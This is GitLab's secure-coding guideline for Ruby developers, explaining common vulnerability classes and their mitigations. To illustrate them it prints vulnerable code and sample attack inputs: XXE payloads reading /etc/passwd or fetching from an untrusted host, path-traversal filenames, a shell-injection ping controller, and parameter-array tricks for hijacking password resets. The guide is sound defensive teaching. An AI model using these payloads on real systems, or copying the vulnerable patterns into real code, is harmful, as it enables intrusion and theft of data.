---
stage: none
group: unassigned
info: Any user with at least the Maintainer role can merge updates to this content. For details, see https://docs.gitlab.com/development/development_processes/#development-guidelines-review.
title: Secure coding development guidelines
---

This document contains descriptions and guidelines for secure Ruby programming practices commonly needed in the GitLab codebase. These guidelines are intended to help developers write secure Ruby code from the start, identify potential security vulnerabilities early in the development process, and follow Ruby-specific best practices. By adhering to these standards, we aim to reduce the number of security vulnerabilities released over time while leveraging Ruby's built-in security features effectively.

## Regular Expressions guidelines

### Anchors / Multi line in Ruby

Unlike other programming languages (for example, Perl or Python) Regular Expressions are matching multi-line by default in Ruby. Consider the following example in Python:

```python
import re
text = "foo\nbar"
matches = re.findall("^bar$",text)
print(matches)
```

The Python example will output an empty array (`[]`) as the matcher considers the whole string `foo\nbar` including the newline (`\n`). In contrast Ruby's Regular Expression engine acts differently:

```ruby
text = "foo\nbar"
p text.match /^bar$/
```

The output of this example is `#<MatchData "bar">`, as Ruby treats the input `text` line by line. To match the whole **string**, the Regex anchors `\A` and `\z` should be used.

#### Impact

This Ruby Regex specialty can have security impact, as often regular expressions are used for validations or to impose restrictions on user-input.

#### Examples

GitLab-specific examples can be found in the following [path traversal](https://gitlab.com/gitlab-org/gitlab/-/issues/36029#note_251262187)
and [open redirect](https://gitlab.com/gitlab-org/gitlab/-/issues/33569) issues.

Another example would be this fictional Ruby on Rails controller:

```ruby
class PingController < ApplicationController
  def ping
    if params[:ip] =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/
      render :text => `ping -c 4 #{params[:ip]}`
    else
      render :text => "Invalid IP"
    end
  end
end
```

Here `params[:ip]` should not contain anything else but numbers and dots. However this restriction can be easily bypassed as the Regex anchors `^` and `$` are being used. Ultimately this leads to a shell command injection in `ping -c 4 #{params[:ip]}` by using newlines in `params[:ip]`.

#### Mitigation

In most cases the anchors `\A` for beginning of text and `\z` for end of text should be used instead of `^` and `$`.

## Denial of Service (ReDoS) / Catastrophic Backtracking

When a regular expression (regex) is used to search for a string and can't find a match,
it may then backtrack to try other possibilities.

For example when the regex `.*!$` matches the string `hello!`, the `.*` first matches
the entire string but then the `!` from the regex is unable to match because the
character has already been used. In that case, the Ruby regex engine _backtracks_
one character to allow the `!` to match.

[ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
is an attack in which the attacker knows or controls the regular expression used.
The attacker may be able to enter user input that triggers this backtracking behavior in a
way that increases execution time by several orders of magnitude.

### Impact

The resource, for example Puma, or Sidekiq, can be made to hang as it takes
a long time to evaluate the bad regex match. The evaluation time may require manual
termination of the resource.

### Examples

Here are some GitLab-specific examples.

User inputs used to create regular expressions:

- [User-controlled filename](https://gitlab.com/gitlab-org/gitlab/-/issues/257497)
- [User-controlled domain name](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/25314)
- [User-controlled email address](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/25122#note_289087459)

Hardcoded regular expressions with backtracking issues:

- [Repository name validation](https://gitlab.com/gitlab-org/gitlab/-/issues/220019)
- [Link validation](https://gitlab.com/gitlab-org/gitlab/-/issues/218753), and [a bypass](https://gitlab.com/gitlab-org/gitlab/-/issues/273771)
- [Entity name validation](https://gitlab.com/gitlab-org/gitlab/-/issues/289934)
- [Validating color codes](https://gitlab.com/gitlab-org/gitlab/-/commit/717824144f8181bef524592eab882dd7525a60ef)

Consider the following example application, which defines a check using a regular expression. A user entering `user@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!.com` as the email on a form will hang the web server.

```ruby
# For ruby versions < 3.2.0
# Press ctrl+c to terminate a hung process
class Email < ApplicationRecord
  DOMAIN_MATCH = Regexp.new('([a-zA-Z0-9]+)+\.com')

  validates :domain_matches

  private

  def domain_matches
    errors.add(:email, 'does not match') if email =~ DOMAIN_MATCH
  end
end
```

### Mitigation

#### Ruby from 3.2.0

Ruby released [Regexp improvements against ReDoS in 3.2.0](https://www.ruby-lang.org/en/news/2022/12/25/ruby-3-2-0-released/). ReDoS will no longer be an issue, with the exception of _"some kind of regular expressions, such as those including advanced features (like back-references or look-around), or with a huge fixed number of repetitions"_.

[Until GitLab enforces a global Regexp timeout](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/145679) you should pass an explicit timeout parameter, particularly when using advanced features or a large number of repetitions. For example:

```ruby
Regexp.new('^a*b?a*()\1$', timeout: 1) # timeout in seconds
```

#### Ruby before 3.2.0

GitLab has [`Gitlab::UntrustedRegexp`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/untrusted_regexp.rb)
 which internally uses the [`re2`](https://github.com/google/re2/wiki/Syntax) library.
`re2` does not support backtracking so we get constant execution time, and a smaller subset of available regex features.

All user-provided regular expressions should use `Gitlab::UntrustedRegexp`.

For other regular expressions, here are a few guidelines:

- If there's a clean non-regex solution, such as `String#start_with?`, consider using it
- Ruby supports some advanced regex features like [atomic groups](https://www.regular-expressions.info/atomic.html)
  and [possessive quantifiers](https://www.regular-expressions.info/possessive.html) that eliminate backtracking
- Avoid nested quantifiers if possible (for example `(a+)+`)
- Try to be as precise as possible in your regex and avoid the `.` if there's an alternative
  - For example, Use `_[^_]+_` instead of `_.*_` to match `_text here_`
- Use reasonable ranges (for example, `{1,10}`) for repeating patterns instead of unbounded `*` and `+` matchers
- When possible, perform simple input validation such as maximum string length checks before using regular expressions
- If in doubt, don't hesitate to ping `@gitlab-com/gl-security/appsec`

## Server Side Request Forgery (SSRF)

### Description

A Server-side Request Forgery (SSRF) is an attack in which an attacker
is able coerce a application into making an outbound request to an unintended
resource. This resource is usually internal. In GitLab, the connection most
commonly uses HTTP, but an SSRF can be performed with any protocol, such as
Redis or SSH.

With an SSRF attack, the UI may or may not show the response. The latter is
called a Blind SSRF. While the impact is reduced, it can still be useful for
attackers, especially for mapping internal network services as part of recon.

### Impact

The impact of an SSRF can vary, depending on what the application server
can communicate with, how much the attacker can control of the payload, and
if the response is returned back to the attacker. Examples of impact that
have been reported to GitLab include:

- Network mapping of internal services
  - This can help an attacker gather information about internal services
    that could be used in further attacks. [More details](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/51327).
- Reading internal services, including cloud service metadata.
  - The latter can be a serious problem, because an attacker can obtain keys that allow control of the victim's cloud infrastructure. (This is also a good reason
    to give only necessary privileges to the token.). [More details](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/51490).
- When combined with CRLF vulnerability, remote code execution. [More details](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293).

### When to Consider

- When the application makes any outbound connection

### Mitigations

In order to mitigate SSRF vulnerabilities, it is necessary to validate the destination of the outgoing request, especially if it includes user-supplied information.

The preferred SSRF mitigations within GitLab are:

1. Only connect to known, trusted domains/IP addresses.
1. Use the [`Gitlab::HTTP`](#gitlab-http-library) library
1. Implement [feature-specific mitigations](#feature-specific-mitigations)

#### GitLab HTTP Library

The [`Gitlab::HTTP`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/http.rb) wrapper library has grown to include mitigations for all of the GitLab-known SSRF vectors. It is also configured to respect the
`Outbound requests` options that allow instance administrators to block all internal connections, or limit the networks to which connections can be made.
The `Gitlab::HTTP` wrapper library delegates the requests to the [`gitlab-http`](https://gitlab.com/gitlab-org/gitlab/-/tree/master/gems/gitlab-http) gem.

In some cases, it has been possible to configure `Gitlab::HTTP` as the HTTP
connection library for 3rd-party gems. This is preferable over re-implementing
the mitigations for a new feature.

- [More details](https://dev.gitlab.org/gitlab/gitlabhq/-/merge_requests/2530/diffs)

#### URL blocker & validation libraries

[`Gitlab::HTTP_V2::UrlBlocker`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/gems/gitlab-http/lib/gitlab/http_v2/url_blocker.rb) can be used to validate that a
provided URL meets a set of constraints. Importantly, when `dns_rebind_protection` is `true`, the method returns a known-safe URI where the hostname
has been replaced with an IP address. This prevents DNS rebinding attacks, because the DNS record has been resolved. However, if we ignore this returned
value, we **will not** be protected against DNS rebinding.

This is the case with validators such as the `AddressableUrlValidator` (called with `validates :url, addressable_url: {opts}` or `public_url: {opts}`).
Validation errors are only raised when validations are called, for example when a record is created or saved. If we ignore the value returned by the validation
when persisting the record, **we need to recheck** its validity before using it. For more information, see [Time of check to time of use bugs](_index.md#time-of-check-to-time-of-use-bugs).

#### Feature-specific mitigations

There are many tricks to bypass common SSRF validations. If feature-specific mitigations are necessary, they should be reviewed by the AppSec team, or a developer who has worked on SSRF mitigations previously.

For situations in which you can't use an allowlist or `GitLab:HTTP`, you must implement mitigations
directly in the feature. It's best to validate the destination IP addresses themselves, not just
domain names, as the attacker can control DNS. Below is a list of mitigations that you should
implement.

- Block connections to all localhost addresses
  - `127.0.0.1/8` (IPv4 - note the subnet mask)
  - `::1` (IPv6)
- Block connections to networks with private addressing (RFC 1918)
  - `10.0.0.0/8`
  - `172.16.0.0/12`
  - `192.168.0.0/24`
- Block connections to link-local addresses (RFC 3927)
  - `169.254.0.0/16`
  - In particular, for GCP: `metadata.google.internal` -> `169.254.169.254`
- For HTTP connections: Disable redirects or validate the redirect destination
- To mitigate DNS rebinding attacks, validate and use the first IP address received.

See [`url_blocker_spec.rb`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/spec/lib/gitlab/url_blocker_spec.rb) for examples of SSRF payloads. For more information about the DNS-rebinding class of bugs, see [Time of check to time of use bugs](_index.md#time-of-check-to-time-of-use-bugs).

Don't rely on methods like `.start_with?` when validating a URL, or make assumptions about which
part of a string maps to which part of a URL. Use the `URI` class to parse the string, and validate
each component (scheme, host, port, path, and so on). Attackers can create valid URLs which look
safe, but lead to malicious locations.

```ruby
user_supplied_url = "https://my-safe-site.com@my-evil-site.com" # Content before an @ in a URL is usually for basic authentication
user_supplied_url.start_with?("https://my-safe-site.com")       # Don't trust with start_with? for URLs!
=> true
URI.parse(user_supplied_url).host
=> "my-evil-site.com"

user_supplied_url = "https://my-safe-site.com-my-evil-site.com"
user_supplied_url.start_with?("https://my-safe-site.com")      # Don't trust with start_with? for URLs!
=> true
URI.parse(user_supplied_url).host
=> "my-safe-site.com-my-evil-site.com"

# Here's an example where we unsafely attempt to validate a host while allowing for
# subdomains
user_supplied_url = "https://my-evil-site-my-safe-site.com"
user_supplied_host = URI.parse(user_supplied_url).host
=> "my-evil-site-my-safe-site.com"
user_supplied_host.end_with?("my-safe-site.com")      # Don't trust with end_with?
=> true
```

## XSS guidelines

### Description

Cross site scripting (XSS) is an issue where malicious JavaScript code gets injected into a trusted web application and executed in a client's browser. The input is intended to be data, but instead gets treated as code by the browser.

XSS issues are commonly classified in three categories, by their delivery method:

- [Persistent XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#stored-xss-aka-persistent-or-type-i)
- [Reflected XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#reflected-xss-aka-non-persistent-or-type-ii)
- [DOM XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#dom-based-xss-aka-type-0)

### Impact

The injected client-side code is executed on the victim's browser in the context of their current session. This means the attacker could perform any same action the victim would typically be able to do through a browser. The attacker would also have the ability to:

- <i class="fa fa-youtube-play youtube" aria-hidden="true"></i> [log victim keystrokes](https://youtu.be/2VFavqfDS6w?t=1367)
- launch a network scan from the victim's browser
- potentially <i class="fa fa-youtube-play youtube" aria-hidden="true"></i> [obtain the victim's session tokens](https://youtu.be/2VFavqfDS6w?t=739)
- perform actions that lead to data loss/theft or account takeover

Much of the impact is contingent upon the function of the application and the capabilities of the victim's session. For further impact possibilities, check out [the beef project](https://beefproject.com/).

For a demonstration of the impact on GitLab with a realistic attack scenario, see [this video on the GitLab Unfiltered channel](https://www.youtube.com/watch?v=t4PzHNycoKo) (internal, it requires being logged in with the GitLab Unfiltered account).

### Mitigation and prevention in Rails

By default, Rails automatically escapes strings when they are inserted into HTML templates. Avoid the
methods used to keep Rails from escaping strings, especially those related to user-controlled values.
Specifically, the following options are dangerous because they mark strings as trusted and safe:

| Method               | Avoid these options           |
|----------------------|-------------------------------|
| HAML templates       | `html_safe`, `raw`, `!=`      |
| Embedded Ruby (ERB)  | `html_safe`, `raw`, `<%== %>` |

In case you want to sanitize user-controlled values against XSS vulnerabilities, you can use
[`ActionView::Helpers::SanitizeHelper`](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html).
Calling `link_to` and `redirect_to` with user-controlled parameters can also lead to cross-site scripting.

Do also sanitize and validate URL schemes.

References:

- <i class="fa fa-youtube-play youtube" aria-hidden="true"></i> [XSS Defense in Rails](https://youtu.be/2VFavqfDS6w?t=2442)
- <i class="fa fa-youtube-play youtube" aria-hidden="true"></i> [XSS Defense with HAML](https://youtu.be/2VFavqfDS6w?t=2796)
- <i class="fa fa-youtube-play youtube" aria-hidden="true"></i> [Validating Untrusted URLs in Ruby](https://youtu.be/2VFavqfDS6w?t=3936)
- <i class="fa fa-youtube-play youtube" aria-hidden="true"></i> [RoR Model Validators](https://youtu.be/2VFavqfDS6w?t=7636)

## XML external entities

### Description

XML external entity (XXE) injection is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. It can lead to disclosure of confidential data, denial of service, server-side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

### Mitigation

The two main ways we can prevent XXE vulnerabilities in our codebase are:

Use a safe XML parser: We prefer using Nokogiri when coding in Ruby. Nokogiri is a great option because it provides secure defaults that protect against XXE attacks. For more information, see the [Nokogiri documentation on parsing an HTML / XML Document](https://nokogiri.org/tutorials/parsing_an_html_xml_document.html#parse-options).

When using Nokogiri, be sure to use the default or safe parsing settings, especially when working with unsanitized user input. Do not use the following unsafe Nokogiri settings ⚠️:

| Setting | Description |
| ------ | ------ |
| `dtdload` | Tries to validate DTD validity of the object which is unsafe when working with unsanitized user input. |
| `huge` | Unsets maximum size/depth of objects that could be used for denial of service. |
| `nononet` | Allows network connections. |
| `noent` | Allows the expansion of XML entities and could result in arbitrary file reads. |

### Safe XML Library

```ruby
require 'nokogiri'

# Safe by default
doc = Nokogiri::XML(xml_string)
```

### Unsafe XML Library, file system leak

```ruby
require 'rexml/document'

# Vulnerable code
xml = <<-EOX
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOX

# Parsing XML without proper safeguards
doc = REXML::Document.new(xml)
puts doc.root.text
# This could output /etc/passwd
```

### Noent unsafe setting initialized, potential file system leak

```ruby
require 'nokogiri'

# Vulnerable code
xml = <<-EOX
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOX

# noent substitutes entities, unsafe when parsing XML
po = Nokogiri::XML::ParseOptions.new.huge.noent
doc = Nokogiri::XML::Document.parse(xml, nil, nil, po)
puts doc.root.text  # This will output the contents of /etc/passwd

##
# User Database
#
# Note that this file is consulted directly only when the system is running
...
```

### Nononet unsafe setting initialized, potential malware execution

```ruby
require 'nokogiri'

# Vulnerable code
xml = <<-EOX
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://untrustedhost.example.com/maliciousCode" >]>
<foo>&xxe;</foo>
EOX

# In this example we use `ParseOptions` but select insecure options.
# NONONET allows network connections while parsing which is unsafe, as is DTDLOAD!
options = Nokogiri::XML::ParseOptions.new(Nokogiri::XML::ParseOptions::NONONET, Nokogiri::XML::ParseOptions::DTDLOAD)

# Parsing the xml above would allow `untrustedhost` to run arbitrary code on our server.
# See the "Impact" section for more.
doc = Nokogiri::XML::Document.parse(xml, nil, nil, options)
```

### Noent unsafe setting set, potential file system leak

```ruby
require 'nokogiri'

# Vulnerable code
xml = <<-EOX
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOX

# setting options may also look like this, NONET disallows network connections while parsing safe
options = Nokogiri::XML::ParseOptions::NOENT | Nokogiri::XML::ParseOptions::NONET

doc = Nokogiri::XML(xml, nil, nil, options) do |config|
  config.nononet  # Allows network access
  config.noent  # Enables entity expansion
  config.dtdload # Enables DTD loading
end

puts doc.to_xml
# This could output the contents of /etc/passwd
```

### Impact

XXE attacks can lead to multiple critical and high severity issues, like arbitrary file read, remote code execution, or information disclosure.

### When to consider

When working with XML parsing, particularly with user-controlled inputs.

## Path Traversal guidelines

### Description

Path Traversal vulnerabilities grant attackers access to arbitrary directories and files on the server that is executing an application. This data can include data, code or credentials.

Traversal can occur when a path includes directories. A typical malicious example includes one or more `../`, which tells the file system to look in the parent directory. Supplying many of them in a path, for example `../../../../../../../etc/passwd`, usually resolves to `/etc/passwd`. If the file system is instructed to look back to the root directory and can't go back any further, then extra `../` are ignored. The file system then looks from the root, resulting in `/etc/passwd` - a file you definitely do not want exposed to a malicious attacker!

### Impact

Path Traversal attacks can lead to multiple critical and high severity issues, like arbitrary file read, remote code execution, or information disclosure.

### When to consider

When working with user-controlled filenames/paths and file system APIs.

### Mitigation and prevention

In order to prevent Path Traversal vulnerabilities, user-controlled filenames or paths should be validated before being processed.

- Comparing user input against an allowlist of allowed values or verifying that it only contains allowed characters.
- After validating the user supplied input, it should be appended to the base directory and the path should be canonicalized using the file system API.

#### GitLab specific validations

The methods `Gitlab::PathTraversal.check_path_traversal!()` and `Gitlab::PathTraversal.check_allowed_absolute_path!()`
can be used to validate user-supplied paths and prevent vulnerabilities.
`check_path_traversal!()` will detect their Path Traversal payloads and accepts URL-encoded paths.
`check_allowed_absolute_path!()` will check if a path is absolute and whether it is inside the allowed path list. By default, absolute
paths are not allowed, so you need to pass a list of allowed absolute paths to the `path_allowlist`
parameter when using `check_allowed_absolute_path!()`.

To use a combination of both checks, follow the example below:

```ruby
Gitlab::PathTraversal.check_allowed_absolute_path_and_path_traversal!(path, path_allowlist)
```

In the REST API, we have the [`FilePath`](https://gitlab.com/gitlab-org/security/gitlab/-/blob/master/lib/api/validations/validators/file_path.rb)
validator that can be used to perform the checking on any file path argument the endpoints have.
It can be used as follows:

```ruby
requires :file_path, type: String, file_path: { allowlist: ['/foo/bar/', '/home/foo/', '/app/home'] }
```

The Path Traversal check can also be used to forbid any absolute path:

```ruby
requires :file_path, type: String, file_path: true
```

Absolute paths are not allowed by default. If allowing an absolute path is required, you
need to provide an array of paths to the parameter `allowlist`.

### Misleading behavior

Some methods used to construct file paths can have non-intuitive behavior. To properly validate user input, be aware
of these behaviors.

The Ruby method [`Pathname.join`](https://ruby-doc.org/stdlib-2.7.4/libdoc/pathname/rdoc/Pathname.html#method-i-join)
joins path names. Using methods in a specific way can result in a path name typically prohibited in
typical use. In the examples below, we see attempts to access `/etc/passwd`, which is a sensitive file:

```ruby
require 'pathname'

p = Pathname.new('tmp')
print(p.join('log', 'etc/passwd', 'foo'))
# => tmp/log/etc/passwd/foo
```

Assuming the second parameter is user-supplied and not validated, submitting a new absolute path
results in a different path:

```ruby
print(p.join('log', '/etc/passwd', ''))
# renders the path to "/etc/passwd", which is not what we expect!
```

## OS command injection guidelines

Command injection is an issue in which an attacker is able to execute arbitrary commands on the host
operating system through a vulnerable application. Such attacks don't always provide feedback to a
user, but the attacker can use simple commands like `curl` to obtain an answer.

### Impact

The impact of command injection greatly depends on the user context running the commands, as well as
how data is validated and sanitized. It can vary from low impact because the user running the
injected commands has limited rights, to critical impact if running as the root user.

Potential impacts include:

- Execution of arbitrary commands on the host machine.
- Unauthorized access to sensitive data, including passwords and tokens in secrets or configuration
  files.
- Exposure of sensitive system files on the host machine, such as `/etc/passwd/` or `/etc/shadow`.
- Compromise of related systems and services gained through access to the host machine.

You should be aware of and take steps to prevent command injection when working with user-controlled
data that are used to run OS commands.

### Mitigation and prevention

To prevent OS command injections, user-supplied data shouldn't be used within OS commands. In cases
where you can't avoid this:

- Validate user-supplied data against an allowlist.
- Ensure that user-supplied data only contains alphanumeric characters (and no syntax or whitespace
  characters, for example).
- Always use `--` to separate options from arguments.

Consider using `system("command", "arg0", "arg1", ...)` whenever you can. This prevents an attacker
from concatenating commands.

For more examples on how to use shell commands securely, consult
[Guidelines for shell commands in the GitLab codebase](../shell_commands.md).
It contains various examples on how to securely call OS commands.

## Working with archive files

Working with archive files like `zip`, `tar`, `jar`, `war`, `cpio`, `apk`, `rar` and `7z` presents an area where potentially critical security vulnerabilities can sneak into an application.

### Utilities for safely working with archive files

There are common utilities that can be used to securely work with archive files.

| Archive type | Utility     |
|--------------|-------------|
| `zip`        | `SafeZip`   |

#### `SafeZip`

SafeZip provides a safe interface to extract specific directories or files within a `zip` archive through the `SafeZip::Extract` class.

Example:

```ruby
Dir.mktmpdir do |tmp_dir|
  SafeZip::Extract.new(zip_file_path).extract(files: ['index.html', 'app/index.js'], to: tmp_dir)
  SafeZip::Extract.new(zip_file_path).extract(directories: ['src/', 'test/'], to: tmp_dir)
rescue SafeZip::Extract::EntrySizeError
  raise Error, "Path `#{file_path}` has invalid size in the zip!"
end
```

### Zip Slip

In 2018, the security company Snyk [released a blog post](https://security.snyk.io/research/zip-slip-vulnerability) describing research into a widespread and critical vulnerability present in many libraries and applications which allows an attacker to overwrite arbitrary files on the server file system which, in many cases, can be leveraged to achieve remote code execution. The vulnerability was dubbed Zip Slip.

A Zip Slip vulnerability happens when an application extracts an archive without validating and sanitizing the filenames inside the archive for directory traversal sequences that change the file location when the file is extracted.

Example malicious filenames:

- `../../etc/passwd`
- `../../root/.ssh/authorized_keys`
- `../../etc/gitlab/gitlab.rb`

If a vulnerable application extracts an archive file with any of these filenames, the attacker can overwrite these files with arbitrary content.

### Insecure archive extraction examples

For zip files, the [`rubyzip`](https://rubygems.org/gems/rubyzip) Ruby gem is already patched against the Zip Slip vulnerability and will refuse to extract files that try to perform directory traversal, so for this vulnerable example we will extract a `tar.gz` file with `Gem::Package::TarReader`:

```ruby
# Vulnerable tar.gz extraction example!

begin
  tar_extract = Gem::Package::TarReader.new(Zlib::GzipReader.open("/tmp/uploaded.tar.gz"))
rescue Errno::ENOENT
  STDERR.puts("archive file does not exist or is not readable")
  exit(false)
end
tar_extract.rewind

tar_extract.each do |entry|
  next unless entry.file? # Only process files in this example for simplicity.

  destination = "/tmp/extracted/#{entry.full_name}" # Oops! We blindly use the entry filename for the destination.
  File.open(destination, "wb") do |out|
    out.write(entry.read)
  end
end
```

#### Best practices

Always expand the destination file path by resolving all potential directory traversals and other sequences that can alter the path and refuse extraction if the final destination path does not start with the intended destination directory.

```ruby
# tar.gz extraction example with protection against Zip Slip attacks.

begin
  tar_extract = Gem::Package::TarReader.new(Zlib::GzipReader.open("/tmp/uploaded.tar.gz"))
rescue Errno::ENOENT
  STDERR.puts("archive file does not exist or is not readable")
  exit(false)
end
tar_extract.rewind

tar_extract.each do |entry|
  next unless entry.file? # Only process files in this example for simplicity.

  # safe_destination will raise an exception in case of Zip Slip / directory traversal.
  destination = safe_destination(entry.full_name, "/tmp/extracted")

  File.open(destination, "wb") do |out|
    out.write(entry.read)
  end
end

def safe_destination(filename, destination_dir)
  raise "filename cannot start with '/'" if filename.start_with?("/")

  destination_dir = File.realpath(destination_dir)
  destination = File.expand_path(filename, destination_dir)

  raise "filename is outside of destination directory" unless
    destination.start_with?(destination_dir + "/"))

  destination
end
```

```ruby
# zip extraction example using rubyzip with built-in protection against Zip Slip attacks.
require 'zip'

Zip::File.open("/tmp/uploaded.zip") do |zip_file|
  zip_file.each do |entry|
    # Extract entry to /tmp/extracted directory.
    entry.extract("/tmp/extracted")
  end
end
```

### Symlink attacks

Symlink attacks makes it possible for an attacker to read the contents of arbitrary files on the server of a vulnerable application. While it is a high-severity vulnerability that can often lead to remote code execution and other critical vulnerabilities, it is only exploitable in scenarios where a vulnerable application accepts archive files from the attacker and somehow displays the extracted contents back to the attacker without any validation or sanitization of symbolic links inside the archive.

### Insecure archive symlink extraction examples

For zip files, the [`rubyzip`](https://rubygems.org/gems/rubyzip) Ruby gem is already patched against symlink attacks as it ignores symbolic links, so for this vulnerable example we will extract a `tar.gz` file with `Gem::Package::TarReader`:

```ruby
# Vulnerable tar.gz extraction example!

begin
  tar_extract = Gem::Package::TarReader.new(Zlib::GzipReader.open("/tmp/uploaded.tar.gz"))
rescue Errno::ENOENT
  STDERR.puts("archive file does not exist or is not readable")
  exit(false)
end
tar_extract.rewind

# Loop over each entry and output file contents
tar_extract.each do |entry|
  next if entry.directory?

  # Oops! We don't check if the file is actually a symbolic link to a potentially sensitive file.
  puts entry.read
end
```

#### Best practices

Always check the type of the archive entry before reading the contents and ignore entries that are not plain files. If you absolutely must support symbolic links, ensure that they only point to files inside the archive and nowhere else.

```ruby
# tar.gz extraction example with protection against symlink attacks.

begin
  tar_extract = Gem::Package::TarReader.new(Zlib::GzipReader.open("/tmp/uploaded.tar.gz"))
rescue Errno::ENOENT
  STDERR.puts("archive file does not exist or is not readable")
  exit(false)
end
tar_extract.rewind

# Loop over each entry and output file contents
tar_extract.each do |entry|
  next if entry.directory?

  # By skipping symbolic links entirely, we are sure they can't cause any trouble!
  next if entry.symlink?

  puts entry.read
end
```

## URL Spoofing

We want to protect our users from bad actors who might try to use GitLab
features to redirect other users to malicious sites.

Many features in GitLab allow users to post links to external websites. It is
important that the destination of any user-specified link is made very clear
to the user.

### `external_redirect_path`

When presenting links provided by users, if the actual URL is hidden, use the `external_redirect_path`
helper method to redirect the user to a warning page first. For example:

```ruby
# Bad :(
# This URL comes from User-Land and may not be safe...
# We need the user to see where they are going.
link_to foo_social_url(@user), title: "Foo Social" do
  sprite_icon('question-o')
end

# Good :)
# The external_redirect "leaving GitLab" page will show the URL to the user
# before they leave.
link_to external_redirect_path(url: foo_social_url(@user)), title: "Foo" do
  sprite_icon('question-o')
end
```

Also see this [real-life usage](https://gitlab.com/gitlab-org/gitlab/-/blob/bdba5446903ff634fb12ba695b2de99b6d6881b5/app/helpers/application_helper.rb#L378) as an example.

## Email and notifications

Ensure that only intended recipients get emails and notifications. Even if your
code is secure when it merges, it's better practice to use the defense-in-depth
"single recipient" check just before sending the email. This prevents a vulnerability
if otherwise-vulnerable code is committed at a later date. For example:

### Example

```ruby
# Insecure if email is user-controlled
def insecure_email(email)
  mail(to: email, subject: 'Password reset email')
end

# A single recipient, just as a developer expects
insecure_email("person@example.com")

# Multiple emails sent when an array is passed
insecure_email(["person@example.com", "attacker@evil.com"])

# Multiple emails sent even when a single string is passed
insecure_email("person@example.com, attacker@evil.com")
```

### Prevention and defense

- Use `Gitlab::Email::SingleRecipientValidator` when adding new emails intended for a single recipient
- Strongly type your code by calling `.to_s` on values, or check its class with `value.kind_of?(String)`

## Request Parameter Typing

This Secure Code Guideline is enforced by the `StrongParams` RuboCop.

In our Rails Controllers you must use `ActionController::StrongParameters`. This ensures that we explicitly define the keys and types of input we expect in a request. It is critical for avoiding Mass Assignment in our Models. It should also be used when parameters are passed to other areas of the GitLab codebase such as Services.

Using `params[:key]` can lead to vulnerabilities when one part of the codebase expects a type like `String`, but gets passed (and handles unsafely and without error) an `Array`.

{{< alert type="note" >}}

This only applies to Rails Controllers. Our API and GraphQL endpoints enforce strong typing, and Go is statically typed.

{{< /alert >}}

### Example

```ruby
class MyMailer
  def reset(user, email)
    mail(to: email, subject: 'Password reset email', body: user.reset_token)
  end
end

class MyController

  # Bad - email could be an array of values
  # ?user[email]=VALUE will find a single user and email a single user
  # ?user[email][]=victim@example.com&user[email][]=attacker@example.com will email the victim's token to the victim and user
  def dangerously_reset_password
    user = User.find_by(email: params[:user][:email])
    MyMailer.reset(user, params[:user][:email])
  end

  # Good - we use StrongParams which doesn't permit the Array type
  # ?user[email]=VALUE will find a single user and email a single user
  # ?user[email][]=victim@example.com&user[email][]=attacker@example.com will fail because there is no permitted :email key
  def safely_reset_password
    user = User.find_by(email: email_params[:email])
    MyMailer.reset(user, email_params[:email])
  end

  # This returns a new ActionController::Parameters that includes only the permitted attributes
  def email_params
    params.require(:user).permit(:email)
  end
end
```

This class of issue applies to more than just email; other examples might include:

- Allowing multiple One Time Password attempts in a single request: `?otp_attempt[]=000000&otp_attempt[]=000001&otp_attempt[]=000002...`
- Passing unexpected parameters like `is_admin` that are later `.merged` in a Service class

### Related topics

- [Watch a walkthrough video](https://www.youtube.com/watch?v=ydg95R2QKwM) for an instance of this issue causing vulnerability CVE-2023-7028.
  The video covers what happened, how it worked, and what you need to know for the future.
- Rails documentation for [ActionController::StrongParameters](https://api.rubyonrails.org/classes/ActionController/StrongParameters.html) and [ActionController::Parameters](https://api.rubyonrails.org/classes/ActionController/Parameters.html)

## Guidelines when defining missing methods with metaprogramming

Metaprogramming is a way to define methods **at runtime**, instead of at the time of writing and deploying the code. It is a powerful tool, but can be dangerous if we allow untrusted actors (like users) to define their own arbitrary methods. For example, imagine we accidentally let an attacker overwrite an access control method to always return true! It can lead to many classes of vulnerabilities such as access control bypass, information disclosure, arbitrary file reads, and remote code execution.

Key methods to watch out for are `method_missing`, `define_method`, `delegate`, and similar methods.

### Insecure metaprogramming example

This example is adapted from an example submitted by [@jobert](https://hackerone.com/jobert?type=user) through our HackerOne bug bounty program.
Thank you for your contribution!

Before Ruby 2.5.1, you could implement delegators using the `delegate` or `method_missing` methods. For example:

```ruby
class User
  def initialize(attributes)
    @options = OpenStruct.new(attributes)
  end

  def is_admin?
    name.eql?("Sid") # Note - never do this!
  end

  def method_missing(method, *args)
    @options.send(method, *args)
  end
end
```

